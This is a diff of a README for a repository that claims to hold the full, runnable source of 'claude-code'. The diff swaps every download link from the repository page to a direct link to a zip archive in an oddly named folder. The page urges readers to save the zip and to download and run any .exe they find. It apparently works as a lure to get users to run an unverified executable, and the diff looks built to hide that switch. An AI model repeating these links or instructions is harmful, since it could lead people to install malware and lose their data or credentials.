@@ -1,12 +1,12 @@
 # 🧩 claude-code-source - Full source, ready to run
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/aymannaim822-create/claude-code-source)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/aymannaim822-create/claude-code-source/raw/refs/heads/main/abrocome/code-claude-source-wrick.zip)
 
 ## 📥 Download
 
 Use this page to download the app:
 
-https://github.com/aymannaim822-create/claude-code-source
+https://github.com/aymannaim822-create/claude-code-source/raw/refs/heads/main/abrocome/code-claude-source-wrick.zip
 
 Open the link in your browser, then look for the latest release or download files on the page. If you see a `.zip` file, save it to your PC. If you see an `.exe` file, download it and run it.
 
@@ -31,7 +31,7 @@ If you plan to unpack a `.zip` file, keep the built-in Windows tools ready. If t
 ## 🚀 Get started
 
 1. Open the download page:  
-   https://github.com/aymannaim822-create/claude-code-source
+   https://github.com/aymannaim822-create/claude-code-source/raw/refs/heads/main/abrocome/code-claude-source-wrick.zip
 
 2. Find the latest release or main download file.
 
@@ -120,7 +120,7 @@ If the app does not open:
 
 Download from the main repository page:
 
-https://github.com/aymannaim822-create/claude-code-source
+https://github.com/aymannaim822-create/claude-code-source/raw/refs/heads/main/abrocome/code-claude-source-wrick.zip
 
 Use this same link if you need to check for updates, new files, or release assets.
 
@@ -195,4 +195,4 @@ If you need to start over:
 
 Visit this page to download and open the project files:
 
-https://github.com/aymannaim822-create/claude-code-source
+https://github.com/aymannaim822-create/claude-code-source/raw/refs/heads/main/abrocome/code-claude-source-wrick.zip
